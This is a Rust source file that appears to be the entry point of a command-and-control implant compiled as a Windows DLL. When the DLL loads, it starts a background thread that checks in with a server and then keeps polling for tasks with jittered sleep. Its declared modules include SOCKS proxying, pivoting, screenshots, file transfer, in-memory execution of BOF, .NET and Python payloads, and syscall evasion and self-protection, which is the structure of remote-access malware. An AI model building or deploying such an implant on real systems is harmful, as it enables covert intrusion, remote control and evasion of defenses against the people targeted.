mod config;
mod checkin;
mod transport;
mod tasking;
mod features {
    pub mod exit;
    pub mod pong;
    pub mod filesystem;
    pub mod upload;
    pub mod download;
    pub mod psw;
    pub mod socks;
    pub mod executeBOF;
    pub mod executeDOT;
    pub mod executePY;
    pub mod list_processes;
    pub mod pivot;
    pub mod screenshot;
}
mod hellshall;
mod selfprotect;
mod worker;
mod helpers;

use std::{thread, time::Duration};

#[no_mangle]
pub extern "system" fn DllMain(
    _hinst: *mut u8,
    reason: u32,
    _reserved: *mut u8,
) -> i32 {
    const DLL_PROCESS_ATTACH: u32 = 1;

    if reason == DLL_PROCESS_ATTACH {
        thread::spawn(|| {
            run();
        });
    }
    1
}

fn run() {
    // selfprotect not available in DLL context
    checkin::checkin();

    loop {
        if let Err(e) = tasking::getTasking() {
            eprintln!("Tasking error: {}", e);
        }
        helpers::sleep_with_jitter();
    }
}
